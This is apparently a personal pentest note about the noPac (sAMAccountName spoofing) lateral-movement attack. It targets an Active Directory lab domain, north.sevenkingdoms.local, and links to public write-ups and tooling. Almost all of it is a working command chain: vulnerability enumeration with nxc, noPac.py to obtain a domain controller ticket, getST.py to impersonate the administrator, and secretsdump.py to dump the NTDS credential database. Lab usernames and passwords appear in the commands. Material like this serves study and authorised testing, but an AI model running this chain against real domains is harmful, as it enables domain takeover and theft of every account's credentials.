#lateral_movement 
attack flow: https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware
all is here: https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing

and https://github.com/Ridter/noPac

enumeration:
```bash
└─$ nxc smb 192.168.56.11 -u brandon.stark -p iseedeadpeople -M nopac
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\brandon.stark:iseedeadpeople
NOPAC       192.168.56.11   445    WINTERFELL       TGT with PAC size 1654
NOPAC       192.168.56.11   445    WINTERFELL       TGT without PAC size 817
NOPAC       192.168.56.11   445    WINTERFELL
NOPAC       192.168.56.11   445    WINTERFELL       VULNERABLE
NOPAC       192.168.56.11   445    WINTERFELL       Next step: https://github.com/Ridter/noPac

```
---
get tgt for computer:
https://github.com/Ridter/noPac
```bash
 python3 ~/tools/noPac/noPac.py 'north.sevenkingdoms.local/jon.snow':'iknownothing' -dc-ip 192.168.56.11

```

export it:
```bash
export KRB5CCNAME=winterfell.ccache
```

get administrator ticket (Obtain a service ticket with S4U2self by presenting the previous TGT):
```bash
getST.py -self -impersonate 'administrator' -altservice 'CIFS/winterfell.north.sevenkingdoms.local' -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell' -debug
```

export ticket
```bash
export KRB5CCNAME=administrator@CIFS_winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache
```


dump ntds
```bash
secretsdump.py -k winterfell.north.sevenkingdoms.local
```